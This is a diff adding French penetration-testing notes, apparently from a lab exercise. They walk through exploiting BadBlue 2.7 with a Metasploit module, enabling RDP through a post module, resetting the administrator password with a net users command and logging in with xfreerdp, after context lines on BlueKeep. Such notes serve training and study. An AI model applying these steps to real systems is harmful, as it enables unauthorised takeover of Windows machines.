@@ -30,3 +30,21 @@ Après avoir fait un scan et identifié le service RDP ouvert, on lance le modul
 Puis exploitation avec :  
 `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` set RHOSTS, RPORT...  
 `show targets` permet de renseigner la version de Windows manuellement.  
+
+### BadBlue 2.7  
+Si cette version est active sur le port 80,
+`search badblue`  
+`exploit/windows/http/badblue_passthru` : Rentrer la cible, puis `set target` et choisir "Badblue\ EE\ 2.7\ Universal"  
+Une fois le meterpreter récupéré (on peut le conserver en x86), on le met en background, puis :  
+`post/windows/manage/enable_rdp`, renseigner la session, puis "run"  
+Lancer un scan avec nmap sur le port 3389 permet de voir que le service est actif.  
+Reprendre la session en cours.  
+`net users` pour lister les utilisateurs actuels sur le système. Il y a "administrator".  
+On peut facilement changer le mot de passe maintenant (car nous avons des droits "SYSTEM") `net users administrator hack_123321`.  
+
+On peut ensuite se connecter en RDP normalement avec les credentials :  
+
+`xfreerdp /u:administrator /p:hack_123321 /v:192.168.1.1`  
+
+
+
